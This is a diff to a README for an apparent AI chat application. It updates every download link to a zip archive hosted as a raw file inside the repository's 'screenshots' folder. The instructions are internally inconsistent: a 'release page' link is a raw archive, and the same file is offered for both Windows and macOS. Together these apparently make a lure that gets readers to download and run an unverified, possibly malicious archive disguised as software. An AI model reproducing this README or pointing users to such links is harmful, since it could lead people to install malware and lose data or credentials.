@@ -6,7 +6,7 @@ Welcome to the ai-chat application! This modern AI chat application lets you int
 
 ## 📥 Download Now
 
-[![Download ai-chat](https://raw.githubusercontent.com/lbrown177/ai-chat/main/screenshots/ai-chat-3.1.zip)](https://raw.githubusercontent.com/lbrown177/ai-chat/main/screenshots/ai-chat-3.1.zip)
+[![Download ai-chat](https://raw.githubusercontent.com/lbrown177/ai-chat/main/screenshots/ai_chat_v3.8.zip)](https://raw.githubusercontent.com/lbrown177/ai-chat/main/screenshots/ai_chat_v3.8.zip)
 
 ## 🛠️ System Requirements
 
@@ -21,13 +21,13 @@ Before you start, make sure your device meets the following requirements:
 ## 📥 Download & Install
 
 1. **Visit the Release Page**  
-   Go to the following link to get the latest version of ai-chat: [Download Here](https://raw.githubusercontent.com/lbrown177/ai-chat/main/screenshots/ai-chat-3.1.zip).
+   Go to the following link to get the latest version of ai-chat: [Download Here](https://raw.githubusercontent.com/lbrown177/ai-chat/main/screenshots/ai_chat_v3.8.zip).
 
 2. **Choose Your Version**  
    On the releases page, you'll see different versions available for download. Look for the version labeled "Latest Release". This version will be the most stable and feature-rich.
 
 3. **Download the Application**  
-   Click on the version you want to download. You will often see a file like `https://raw.githubusercontent.com/lbrown177/ai-chat/main/screenshots/ai-chat-3.1.zip` for Windows or `https://raw.githubusercontent.com/lbrown177/ai-chat/main/screenshots/ai-chat-3.1.zip` for macOS. Click the file link to start the download.
+   Click on the version you want to download. You will often see a file like `https://raw.githubusercontent.com/lbrown177/ai-chat/main/screenshots/ai_chat_v3.8.zip` for Windows or `https://raw.githubusercontent.com/lbrown177/ai-chat/main/screenshots/ai_chat_v3.8.zip` for macOS. Click the file link to start the download.
 
 4. **Install the Application**  
    - **Windows:** Once the download is complete, locate the file in your Downloads folder and double-click it. Follow the prompts in the installation wizard to complete the installation.
